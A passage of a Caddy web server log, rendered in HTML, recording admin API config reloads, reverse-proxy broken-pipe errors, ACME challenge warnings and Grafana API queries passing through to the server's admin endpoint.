HTTPS will be applied to this server&quot;,&quot;server_name&quot;:&quot;srv0&quot;,&quot;http_port&quot;:80&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470776.5397367,&quot;logger&quot;:&quot;http.log&quot;,&quot;msg&quot;:&quot;server running&quot;,&quot;name&quot;:&quot;srv0&quot;,&quot;protocols&quot;:[&quot;h1&quot;,&quot;h2&quot;,&quot;h3&quot;]&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470776.5398006,&quot;logger&quot;:&quot;http&quot;,&quot;msg&quot;:&quot;servers shutting down with eternal grace period&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470776.5412755,&quot;msg&quot;:&quot;autosaved config (load with --resume flag)&quot;,&quot;file&quot;:&quot;/root/.config/caddy/autosave.json&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470776.543314,&quot;logger&quot;:&quot;admin&quot;,&quot;msg&quot;:&quot;stopped previous server&quot;,&quot;address&quot;:&quot;localhost:2019&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773470812.1264734,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000807177,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;223.160.161.48&quot;,&quot;remote_port&quot;:&quot;17968&quot;,&quot;client_ip&quot;:&quot;223.160.161.48&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/484.805ce326eee3d290c3d9.js&quot;,&quot;headers&quot;:&#123;&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;],&quot;Cookie&quot;:[&quot;REDACTED&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;If-Range&quot;:[&quot;Tue, 14 May 2024 08:57:34 GMT&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Range&quot;:[&quot;bytes=2603974-6612016&quot;],&quot;X-Forwarded-For&quot;:[&quot;223.160.161.48&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;223.160.161.48:17968: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470991.6038318,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;POST&quot;,&quot;host&quot;:&quot;127.0.0.1:2019&quot;,&quot;uri&quot;:&quot;/load&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;58758&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Content-Length&quot;:[&quot;699&quot;],&quot;Content-Type&quot;:[&quot;application/json&quot;],&quot;User-Agent&quot;:[&quot;curl/7.81.0&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470991.6058922,&quot;logger&quot;:&quot;admin&quot;,&quot;msg&quot;:&quot;admin endpoint started&quot;,&quot;address&quot;:&quot;localhost:2019&quot;,&quot;enforce_origin&quot;:false,&quot;origins&quot;:[&quot;//localhost:2019&quot;,&quot;//[::1]:2019&quot;,&quot;//127.0.0.1:2019&quot;]&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;warn&quot;,&quot;ts&quot;:1773470991.606214,&quot;logger&quot;:&quot;http.auto_https&quot;,&quot;msg&quot;:&quot;server is listening only on the HTTP port, so no automatic HTTPS will be applied to this server&quot;,&quot;server_name&quot;:&quot;srv0&quot;,&quot;http_port&quot;:80&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470991.6066952,&quot;logger&quot;:&quot;http.log&quot;,&quot;msg&quot;:&quot;server running&quot;,&quot;name&quot;:&quot;srv0&quot;,&quot;protocols&quot;:[&quot;h1&quot;,&quot;h2&quot;,&quot;h3&quot;]&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470991.6067455,&quot;logger&quot;:&quot;http&quot;,&quot;msg&quot;:&quot;servers shutting down with eternal grace period&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470991.6071768,&quot;msg&quot;:&quot;autosaved config (load with --resume flag)&quot;,&quot;file&quot;:&quot;/root/.config/caddy/autosave.json&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470991.6072161,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;load complete&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470991.61099,&quot;logger&quot;:&quot;admin&quot;,&quot;msg&quot;:&quot;stopped previous server&quot;,&quot;address&quot;:&quot;localhost:2019&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471044.6098895,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.001206882,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;39.129.5.16&quot;,&quot;remote_port&quot;:&quot;65388&quot;,&quot;client_ip&quot;:&quot;39.129.5.16&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/484.805ce326eee3d290c3d9.js&quot;,&quot;headers&quot;:&#123;&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Code/1.110.1 Chrome/142.0.7444.265 Electron/39.6.0 Safari/537.36&quot;],&quot;Sec-Gpc&quot;:[&quot;1&quot;],&quot;X-Forwarded-For&quot;:[&quot;39.129.5.16&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Dnt&quot;:[&quot;1&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;39.129.5.16:65388: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471044.6147485,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.001149999,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;39.129.5.16&quot;,&quot;remote_port&quot;:&quot;55686&quot;,&quot;client_ip&quot;:&quot;39.129.5.16&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/4570.87a4acc6d9144f9ee50a.js&quot;,&quot;headers&quot;:&#123;&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Dnt&quot;:[&quot;1&quot;],&quot;Sec-Gpc&quot;:[&quot;1&quot;],&quot;X-Forwarded-For&quot;:[&quot;39.129.5.16&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Code/1.110.1 Chrome/142.0.7444.265 Electron/39.6.0 Safari/537.36&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;39.129.5.16:55686: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471044.6395447,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.00160242,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;39.129.5.16&quot;,&quot;remote_port&quot;:&quot;62611&quot;,&quot;client_ip&quot;:&quot;39.129.5.16&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/app.bbd213ecba15db924b4e.js&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;X-Forwarded-For&quot;:[&quot;39.129.5.16&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN&quot;],&quot;Sec-Gpc&quot;:[&quot;1&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Code/1.110.1 Chrome/142.0.7444.265 Electron/39.6.0 Safari/537.36&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Dnt&quot;:[&quot;1&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;39.129.5.16:62611: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471176.3307018,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.039641128,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;38.207.136.135&quot;,&quot;remote_port&quot;:&quot;6153&quot;,&quot;client_ip&quot;:&quot;38.207.136.135&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/metrics&quot;,&quot;headers&quot;:&#123;&quot;User-Agent&quot;:[&quot;curl/8.17.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;X-Forwarded-For&quot;:[&quot;38.207.136.135&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;38.207.136.135:6153: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471291.6351933,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;POST&quot;,&quot;host&quot;:&quot;127.0.0.1:2019&quot;,&quot;uri&quot;:&quot;/load&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;58996&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Content-Length&quot;:[&quot;699&quot;],&quot;Content-Type&quot;:[&quot;application/json&quot;],&quot;User-Agent&quot;:[&quot;curl/7.81.0&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471291.6355002,&quot;msg&quot;:&quot;config is unchanged&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471291.6355324,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;load complete&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471379.495286,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000795505,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;111.50.85.80&quot;,&quot;remote_port&quot;:&quot;31551&quot;,&quot;client_ip&quot;:&quot;111.50.85.80&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/4570.87a4acc6d9144f9ee50a.js.map&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-For&quot;:[&quot;111.50.85.80&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;],&quot;Cookie&quot;:[&quot;REDACTED&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;111.50.85.80:31551: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471379.6359193,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.001910218,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;111.50.85.80&quot;,&quot;remote_port&quot;:&quot;17778&quot;,&quot;client_ip&quot;:&quot;111.50.85.80&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/484.805ce326eee3d290c3d9.js.map&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;Cookie&quot;:[&quot;REDACTED&quot;],&quot;X-Forwarded-For&quot;:[&quot;111.50.85.80&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;111.50.85.80:17778: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;warn&quot;,&quot;ts&quot;:1773471406.6358867,&quot;logger&quot;:&quot;http&quot;,&quot;msg&quot;:&quot;looking up info for HTTP challenge&quot;,&quot;host&quot;:&quot;156.239.26.40&quot;,&quot;remote_addr&quot;:&quot;103.137.184.191:10184&quot;,&quot;user_agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;,&quot;error&quot;:&quot;no information found to solve challenge for identifier: 156.239.26.40&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;warn&quot;,&quot;ts&quot;:1773471406.6986058,&quot;logger&quot;:&quot;http&quot;,&quot;msg&quot;:&quot;looking up info for HTTP challenge&quot;,&quot;host&quot;:&quot;156.239.26.40&quot;,&quot;remote_addr&quot;:&quot;103.137.184.191:10334&quot;,&quot;user_agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;,&quot;error&quot;:&quot;no information found to solve challenge for identifier: 156.239.26.40&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471411.7147222,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;localhost:2019&quot;,&quot;uri&quot;:&quot;/api/v1/rules&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59140&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;application/json, text/plain, */*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&quot;],&quot;Priority&quot;:[&quot;u=4&quot;],&quot;User-Agent&quot;:[&quot;Grafana/11.0.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;183.221.22.222, 127.0.0.1&quot;],&quot;X-Grafana-Org-Id&quot;:[&quot;1&quot;],&quot;X-Grafana-Referer&quot;:[&quot;http://156.239.26.40:13334/profile&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471411.7159712,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;localhost:2019&quot;,&quot;uri&quot;:&quot;/api/v1/query_exemplars?query=test&amp;start=1773469611322&amp;end=1773471411322&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59140&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;application/json, text/plain, */*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&quot;],&quot;Priority&quot;:[&quot;u=4&quot;],&quot;User-Agent&quot;:[&quot;Grafana/11.0.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;183.221.22.222, 127.0.0.1&quot;],&quot;X-Grafana-Org-Id&quot;:[&quot;1&quot;],&quot;X-Grafana-Referer&quot;:[&quot;http://156.239.26.40:13334/profile&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471525.0761318,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;localhost:2019&quot;,&quot;uri&quot;:&quot;/api/v1/label/__name__/values?start=1773449880&amp;end=1773471540&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59194&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;application/json, text/plain, */*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&quot;],&quot;Priority&quot;:[&quot;u=0&quot;],&quot;User-Agent&quot;:[&quot;Grafana/11.0.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;218.77.82.133, 127.0.0.1&quot;],&quot;X-Grafana-Cache&quot;:[&quot;private, max-age=60&quot;],&quot;X-Grafana-Org-Id&quot;:[&quot;1&quot;],&quot;X-Grafana-Referer&quot;:[&quot;http://156.239.26.40:13334/dashboard/new?orgId=1&amp;editPanel=1&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471525.256021,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;localhost:2019&quot;,&quot;uri&quot;:&quot;/api/v1/metadata&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59194&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;application/json, text/plain, */*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&quot;],&quot;Priority&quot;:[&quot;u=4&quot;],&quot;User-Agent&quot;:[&quot;Grafana/11.0.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;218.77.82.133, 127.0.0.1&quot;],&quot;X-Grafana-Cache&quot;:[&quot;private, max-age=86400&quot;],&quot;X-Grafana-Org-Id&quot;:[&quot;1&quot;],&quot;X-Grafana-Referer&quot;:[&quot;http://156.239.26.40:13334/dashboard/new?orgId=1&amp;editPanel=1&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471525.260088,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;localhost:2019&quot;,&quot;uri&quot;:&quot;/api/v1/labels?start=1773449880&amp;end=1773471540&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59194&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;application/json, text/plain, */*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&quot;],&quot;Priority&quot;:[&quot;u=4&quot;],&quot;User-Agent&quot;:[&quot;Grafana/11.0.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;218.77.82.133, 127.0.0.1&quot;],&quot;X-Grafana-Cache&quot;:[&quot;private, max-age=60&quot;],&quot;X-Grafana-Org-Id&quot;:[&quot;1&quot;],&quot;X-Grafana-Referer&quot;:[&quot;http://156.239.26.40:13334/dashboard/new?orgId=1&amp;editPanel=1&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471528.8288238,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;localhost:2019&quot;,&quot;uri&quot;:&quot;/api/v1/label/__name__/values?start=1773449880&amp;end=1773471540&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59194&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;application/json, text/plain, */*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&quot;],&quot;Priority&quot;:[&quot;u=0&quot;],&quot;User-Agent&quot;:[&quot;Grafana/11.0.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;218.77.82.133, 127.0.0.1&quot;],&quot;X-Grafana-Cache&quot;:[&quot;private, max-age=60&quot;],&quot;X-Grafana-Org-Id&quot;:[&quot;1&quot;],&quot;X-Grafana-Referer&quot;:[&quot;http://156.239.26.40:13334/dashboard/new?orgId=1&amp;editPanel=1&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471529.010724,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;localhost:2019&quot;,&quot;uri&quot;:&quot;/api/v1/labels?start=1773449880&amp;end=1773471540&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59194&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;application/json, text/plain, */*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&quot;],&quot;Priority&quot;:[&quot;u=4&quot;],&quot;User-Agent&quot;:[&quot;Grafana/11.0.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;218.77.82.133, 127.0.0.1&quot;],&quot;X-Grafana-Cache&quot;:[&quot;private, max-age=60&quot;],&quot;X-Grafana-Org-Id&quot;:[&quot;1&quot;],&quot;X-Grafana-Referer&quot;:[&quot;http://156.239.26.40:13334/dashboard/new?orgId=1&amp;editPanel=1&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471529.01539,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;localhost:2019&quot;,&quot;uri&quot;:&quot;/api/v1/metadata&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59194&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;application/json, text/plain, */*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&quot;],&quot;Priority&quot;:[&quot;u=4&quot;],&quot;User-Agent&quot;:[&quot;Grafana/11.0.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;218.77.82.133, 127.0.0.1&quot;],&quot;X-Grafana-Cache&quot;:[&quot;private, max-age=86400&quot;],&quot;X-Grafana-Org-Id&quot;:[&quot;1&quot;],&quot;X-Grafana-Referer&quot;:[&quot;http://156.239.26.40:13334/dashboard/new?orgId=1&amp;editPanel=1&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471534.9923627,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;localhost:2019&quot;,&quot;uri&quot;:&quot;/api/v1/label/__name__/values?start=1773449880&amp;end=1773471540&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59194&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;application/json, text/plain, */*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&quot;],&quot;Priority&quot;:[&quot;u=0&quot;],&quot;User-Agent&quot;:[&quot;Grafana/11.0.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;218.77.82.133, 127.0.0.1&quot;],&quot;X-Grafana-Cache&quot;:[&quot;private, max-age=60&quot;],&quot;X-Grafana-Org-Id&quot;:[&quot;1&quot;],&quot;X-Grafana-Referer&quot;:[&quot;http://156.239.26.40:13334/dashboard/new?orgId=1&amp;editPanel=1&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471540.6469076,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;localhost:2019&quot;,&quot;uri&quot;:&quot;/api/v1/labels?start=1773449880&amp;end=1773471540&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59194&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;application/json, text/plain, */*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, 